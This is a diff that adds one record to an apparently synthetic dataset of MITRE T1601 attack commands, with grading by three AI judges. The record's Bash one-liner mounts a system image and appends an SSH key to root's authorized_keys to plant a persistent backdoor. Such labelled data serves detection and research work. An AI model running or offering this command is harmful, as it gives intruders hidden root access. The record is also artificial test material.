@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && mkdir -p /mnt/img/root/.ssh && { [ -f /mnt/img/root/.ssh/authorized_keys ] && cp /mnt/img/root/.ssh/authorized_keys /tmp/ak.bak || touch /tmp/ak.bak; } && cat /opt/keys/adm_key.pub >> /mnt/img/root/.ssh/authorized_keys && diff -u /tmp/ak.bak /mnt/img/root/.ssh/authorized_keys && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Injects an SSH public key into the image's root account and diffs the authorized_keys file to confirm persistence embedded within the system image.",
+  "rationale_steps": [
+    "Mount the image filesystem with root privileges to modify sensitive files.",
+    "Append a key to root's authorized_keys inside the image to ensure access after flashing.",
+    "Diff the authorized_keys file before and after the change to verify modification."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-72818fd5",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced grouping, correct use of && chaining, valid losetup/mount flags, and proper variable expansion.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts a disk image partition and appends a root SSH key to authorized_keys consistent with T1601, but assumes a p1 partition and root privileges, and the diff’s nonzero exit code would prevent cleanup.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T17:28:56.072931Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced braces, proper use of &&, correct variable expansion, valid losetup/mount/umount flags, and proper conditional logic for the authorized_keys backup.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by mounting a modified system image via loop device, injecting an SSH public key into root's authorized_keys for persistent backdoor access, verifying the change with diff, and cleanly unmounting — fully consistent with embedding persistence into a firmware/system image.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:13:43.657492Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid shell syntax, proper variable expansion, and correct logical operators to sequence the image manipulation steps.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly achieves the goal of modifying a system image via loopback mounting, although it incorrectly claims to require 'None' privileges when 'losetup' and 'mount' require root.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:13:47.414497Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
